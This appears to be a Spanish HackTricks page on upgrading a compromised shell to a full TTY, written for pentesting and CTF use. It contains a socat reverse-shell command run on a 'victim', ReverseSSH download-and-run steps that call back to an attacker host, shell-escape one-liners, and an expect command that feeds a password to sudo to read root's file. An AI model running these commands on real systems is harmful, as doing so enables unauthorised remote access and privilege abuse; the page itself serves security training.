# TTYs completos

{{#include ../../banners/hacktricks-training.md}}

## TTY completo

Ten en cuenta que el shell que establezcas en la variable `SHELL` **debe** estar **incluido en** _**/etc/shells**_ o aparecerá `The value for the SHELL variable was not found in the /etc/shells file This incident has been reported`. Además, ten en cuenta que los siguientes snippets solo funcionan en bash. Si estás en zsh, cambia a bash antes de obtener el shell ejecutando `bash`.

#### Python
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
> [!TIP]
> Puedes obtener el **número** de **filas** y **columnas** ejecutando **`stty -a`**

#### script
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
#### socat
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **Generar shells**

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `script -qc /bin/bash /dev/null`
- `perl -e 'exec "/bin/sh";'`
- perl: `exec "/bin/sh";`
- ruby: `exec "/bin/sh"`
- lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap: `!sh`

## ReverseSSH

Una forma práctica de obtener **acceso interactivo al shell**, así como realizar **transferencias de archivos** y **port forwarding**, es subir el servidor ssh enlazado estáticamente [ReverseSSH](https://github.com/Fahrj/reverse-ssh) al objetivo.<sup>[[1]](#references)</sup>

A continuación se muestra un ejemplo para `x86` con binarios comprimidos con upx. Para otros binarios, consulta [releases page](https://github.com/Fahrj/reverse-ssh/releases/latest/).

1. Prepárate localmente para recibir la solicitud de port forwarding de ssh:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
- (2a) Objetivo Linux:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
- (2b) Objetivo Windows 10 (para versiones anteriores, consulta el [README del proyecto](https://github.com/Fahrj/reverse-ssh#features)):
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
- Si la solicitud de port forwarding de ReverseSSH fue exitosa, ahora deberías poder iniciar sesión con la contraseña predeterminada `letmeinbrudipls` en el contexto del usuario que ejecuta `reverse-ssh(.exe)`:
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Penelope

[Penelope](https://github.com/brightio/penelope) actualiza automáticamente las reverse shells de Linux a TTY, gestiona el tamaño de la terminal, registra todo y mucho más. También proporciona soporte de readline para Windows shells.<sup>[[2]](#references)</sup>

![penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

## Sin TTY

Si por alguna razón no puedes obtener un TTY completo, **aún puedes interactuar con programas** que esperan una entrada del usuario. En el siguiente ejemplo, la contraseña se pasa a `sudo` para leer un archivo:
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
## Referencias

- [1] [ReverseSSH - Servidor ssh enlazado estáticamente con funcionalidad de reverse shell para CTFs y similares](https://github.com/Fahrj/reverse-ssh)
- [2] [Penelope - Handler de Shell que automatiza algunas tareas para facilitar el trabajo](https://github.com/brightio/penelope)

{{#include ../../banners/hacktricks-training.md}}
